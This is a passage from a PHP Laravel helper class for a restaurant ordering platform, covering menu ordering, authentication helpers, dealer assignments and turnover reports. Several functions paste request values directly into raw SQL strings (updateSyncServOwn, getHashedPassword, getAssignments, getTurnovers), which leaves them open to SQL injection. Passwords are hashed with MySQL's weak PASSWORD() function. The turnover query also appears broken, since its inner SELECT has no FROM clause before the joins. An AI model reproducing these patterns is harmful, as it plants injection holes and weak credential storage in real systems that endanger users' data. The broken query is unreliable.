                    $query->where(['ID_restaurant' =>  $restaurantId, 'isActive' => 1]);
                });
            })->get();
        $menu_groups = $menu_groups->filter(function($item) use ($restaurantId){
            $menu_visual_order = MenuVisualOrder::where(['level' => $this->MENU_GROUP_LEVEL, 'ID_item' => $item->ID, 'ID_restaurant' => $restaurantId])->first();
            if ($menu_visual_order){
                $item->new_cust_order = $menu_visual_order->cust_order;
            } else {
                $item->new_cust_order = $this->DEFAULT_LEVEL;
            }
            return true;
        });
        return $menu_groups->sortBy('new_cust_order');
    }

    public function getMenuSubGroups($restaurantId, $menuGroupId)
    {

        $menu_subgroups = MenuSubGroup::where("ID_menu_group", $menuGroupId)
            ->whereHas('menu_lists', function($query) use ($restaurantId){
                $query->where(['ID_restaurant' =>  $restaurantId, 'isActive' => 1]);
            })->get();
        $menu_subgroups = $menu_subgroups->filter(function($item) use ($restaurantId){
            $menu_visual_order = MenuVisualOrder::where(['level' => $this->MENU_SUB_GROUP_LEVEL, 'ID_item' => $item->ID, 'ID_restaurant' => $restaurantId])->first();
            if ($menu_visual_order){
                $item->new_cust_order = $menu_visual_order->cust_order;
            } else {
                $item->new_cust_order = $this->DEFAULT_LEVEL;
            }
            return true;
        });

        return $menu_subgroups->sortBy('new_cust_order');
    }

    public function getMenuListsHelper($request, $restaurantId, $menuSubGroupId)
    {
        $menu_lists = MenuList::where(
            ["ID_restaurant" => $restaurantId,
                "ID_menu_subgroup" => $menuSubGroupId]
        );
        return $menu_lists->filterByActive($request)->get()->sortBy('cust_order');
    }

    public function distance($start_lat, $start_long, $end_lat, $end_long){
        $geotools = new Geotools();
        $coordA   = new Coordinate([$start_lat, $start_long]);
        $coordB   = new Coordinate([$end_lat, $end_long]);
        $distance = $geotools->distance()->setFrom($coordA)->setTo($coordB);
        return $distance->in('km')->flat();
    }

    public function getLogo($photos){
        $exterior = [];
        $interior = [];
        $garden = [];
        foreach ($photos as $photo) {
            if ($photo->item_type == "exterior"){
                $exterior[] = $photo->upload_directory . $photo->minified_image_name;
            } else if ($photo->item_type == "interior"){
                $interior[] = $photo->upload_directory . $photo->minified_image_name;
            } else if ($photo->item_type == "garden"){
                $garden[] = $photo->upload_directory . $photo->minified_image_name;
            }
        }
        if (count($exterior)){
            return $exterior[0];
        } else if (count($garden)){
            return $garden[0];
        } else if (count($interior)){
            return $interior[0];
        }
        return null;
    }

    public function updateSyncServOwn($inputStr) {
        $result = DB::select("SELECT * from sync_serv_own WHERE ID_restaurant='".$inputStr."';");
        if(count($result) == 0) {
            DB::insert("INSERT INTO sync_serv_own(ID_restaurant) values('$inputStr');");
            return "1";
        }
        return "0";
    }

    public function updateSyncServOwnTable($restaurantID, $updated = 0) {
        $data = SyncServOwn::where('ID_restaurant', $restaurantID)->first();
        if (!$data) {
            $data = new SyncServOwn();
            $data->ID_restaurant = $restaurantID;
        }

        if ($updated == 0) {
            $data->orders = Carbon::now();
            $data->orders_detail = Carbon::now();
            $data->client = Carbon::now();
            $data->payment = Carbon::now();
            $data->user = Carbon::now();

            $client = app('Dingo\Api\Auth\Auth')->user()->client;
            $user = app('Dingo\Api\Auth\Auth')->user();

            $client->last_update = Carbon::now();
            $client->save();

            $user->last_update = Carbon::now();
            $user->save();
        } else {
            $data->orders = Carbon::now();
            $data->orders_detail = Carbon::now();
        }

        $data->save();

        return 1;
    }

    public static function getHashedPassword($inputStr) {
        $result = DB::select("SELECT PASSWORD('$inputStr');");
        $arrayResult = array_values(json_decode(json_encode($result), true)[0]);
        return $arrayResult[0];
    }

    public static function authRestaurant($email, $hashedPassword) {
        $result = Restaurant::where(
            ["email" => $email, "password" => $hashedPassword]
        )->first();

        return !is_null($result);
    }

    public static function getAssignments($request){
   
        $condition_query = "1=1 ";
        if ( $request->id != "" && $request->id != null )
        {
            $condition_query .= " AND restaurant.id ='".$request->id."'";
        }
        else 
        {
            if ( $request->name != "" && $request->name != null ) $condition_query .= " AND restaurant.name like '%".$request->name."%'";
            if ( $request->unassigned == "true" ) $condition_query .= " AND restaurant.id_user_dealer IS NULL";
                //$condition_query .= " AND restaurant.id_user_dealer IS ".($request->unassigned ? "NULL" :"NOT NULL");
            if ( $request->country != "" && $request->country != null ){
                if ( $request->district != "" && $request->district != null ){
                    $condition_query .= " AND restaurant.id_district = '".$request->district."'";
                }else{
                    $condition_query .= " AND district.country = '".$request->country."'";
                }
            }

            if ($request->status != "" && $request->status != null ){
                $condition_query .= " AND restaurant.status = '".$request->status."'";
            }
        } 

        $result = Restaurant::select(
                'restaurant.id as id', 
                'restaurant.name as name', 
                 DB::raw('CONCAT(restaurant.street,  " ", restaurant.city) as address') ,
                'restaurant.id_district as id_district',
                'restaurant.phone as phone', 
                'district.name as district',                
                'district.country as country',                
                'restaurant.id_user_dealer as id_user_dealer',
                'restaurant.status as status',
                'restaurant.id_user_acquire as id_user_acquire', 
                'restaurant.id_user_contract as id_user_contract',
                'restaurant.id_user as id_user',      
                'user_p.phone as owner',
                'user_c.name as contract',
                'user_d.name as dealer')
                ->leftJoin('user as user_d', 'user_d.id', '=', 'restaurant.id_user_dealer')
                ->leftJoin('user as user_c', 'user_c.id', '=', 'restaurant.id_user_contract') 
                ->leftJoin('user as user_p', 'user_p.id', '=', 'restaurant.id_user')                                  
                ->leftJoin('district', 'district.id', '=', 'restaurant.id_district')
                ->whereRaw($condition_query)
                ->orderBy('restaurant.id', 'ASC')
                ->get();

            //$currentPage = LengthAwarePaginator::resolveCurrentPage();

            $pagedData = $result->slice(($request->currentPage - 1) * $request->perPage, $request->perPage)->all();

            return new LengthAwarePaginator($pagedData, count($result), $request->perPage);            
    }

    public static function getTurnovers($request, $isSum){

        $sql_before = "SELECT * FROM (SELECT tt.*,
            (bs.turnover - tt.turnover) AS distance,            
            (CASE WHEN tt.comm THEN tt.comm ELSE bs.finance END ) * tt.turnover /100  AS commission,
            bs.finance
         FROM ( SELECT  ID_restaurant,
                        NAME,
                        id_user,
                        all_turnovers,
                        district,
                        COUNT(*) AS orders,
            SUM(persons) AS persons,
            SUM( CASE WHEN table_until IS NOT NULL THEN 1 ELSE 0 END ) AS tbl,
            SUM( CASE WHEN pick_up = 'Y' THEN 1 ELSE 0 END ) AS pickup,
            SUM( CASE WHEN delivery_address IS NOT NULL THEN 1 ELSE 0 END ) AS delivery,
                        commission comm,
                        SUM(price) AS turnover
                        FROM (
                            SELECT
                    o.id,

                                    o.ID_restaurant,
                                    o.persons,
                                    o.table_until,
                                    o.pick_up,
                                    o.delivery_address,
                                    r.name AS NAME,
                                    r.id_user_data AS id_user,
                                    e.all_turnovers AS all_turnovers,
                                    dt.id AS district,
                                    od.id_orders,
                                    od.commission,
                                    SUM( od.price ) AS price
                            LEFT JOIN orders o ON od.ID_orders = o.id 
                            LEFT JOIN restaurant r ON r.id = o.ID_restaurant
                            LEFT JOIN employee e ON r.id_user_data = e.id_user
                            LEFT JOIN district dt ON r.id_district = dt.id ";


        $sql_after = " GROUP BY od.ID_orders
                            ORDER BY o.id ) r
                        GROUP BY r.ID_restaurant) AS tt, bill_setting bs                     
                         WHERE bs.turnover - tt.turnover > 0
                                ORDER BY ID_restaurant, ABS(distance) ) AS com
                         GROUP BY ID_restaurant";

        $cond_date_query = "";
        $daterange = json_decode($request->daterange);

        if ( $daterange->startDate != "" && $daterange->startDate != null )
        {
            $cond_date_query = "AND  od.serve_at >= '".$daterange->startDate.
                                "' AND od.serve_at <= '". $daterange->endDate."'";
        }

        $cond_com_query = "";
        if ($request->companies != "" && $request->companies != null && $request->companies == 1 ){
            //$cond_com_query = " AND e.all_turnovers = 1";
            $cond_com_query = " AND r.id_user_dealer = '". $request->user_id ."'";
        }

        $cond_pos_query = "";
        if ( $request->country != "" && $request->country != null ){
            if ( $request->district != "" && $request->district != null ){
                $cond_pos_query .= " AND r.id_district = '".$request->district."'";
            }else{
                $cond_pos_query .= " AND dt.country = '".$request->country."'";
            }
        }
        $cond_status_query = " AND o.status IN (0, 1, 2, 3, 4, 5)";

        if ( $request->new=="false"  || $request->new == null){
            $cond_status_query .= "AND o.status <> 0";
        }
        if ( $request->pending=="false" || $request->pending == null){
            $cond_status_query .= " AND o.status <> 1";
        } 
        if ( $request->confirmed=="false" || $request->confirmed == null){
            $cond_status_query .= " AND o.status <> 2";
        }   
        if ( $request->cancelled=="false" || $request->cancelled == null){
            $cond_status_query .= " AND o.status <> 3";
        }   
        if ( $request->finalized=="false" || $request->finalized == null){
            $cond_status_query .= " AND o.status <> 4";
        }   
        if ( $request->incart=="false" || $request->incart == null){
            $cond_status_query .= " AND o.status <> 5";
        }


        if ( $cond_com_query != "" || $cond_pos_query != "" ||  $cond_status_query != "" ){
            $sql_before .= " WHERE 1 ".$cond_date_query.$cond_com_query.$cond_pos_query.$cond_status_query;
        }

        $sql = $sql_before." ".$sql_after;

        if ( !$isSum ){
            $datas = DB::select( DB::raw($sql) );
            return $datas;
        }else{
            $sum_sql = "SELECT SUM(orders) orders, SUM(persons) persons, SUM(tbl) tbl, SUM(pickup) pickup, SUM(turnover) turnover, SUM(commission) commission FROM ( ";
            $sum_sql .= $sql;
            $sum_sql .= ") AS tor";
            $sum = DB::select(DB::raw($sum_sql));

            return $sum;
        }


        //return $sql;
    }

    public function getMenuList($ID){
        $menuList = MenuList::where(["ID" => $ID['id']])->get();
        $setting = Setting::where(["currency_short" => trim($ID['currency'])])->get();
        $output['data']= array(
            "menuList" => $menuList,
            "setting" => $setting
        );
        return $output;
    }

}
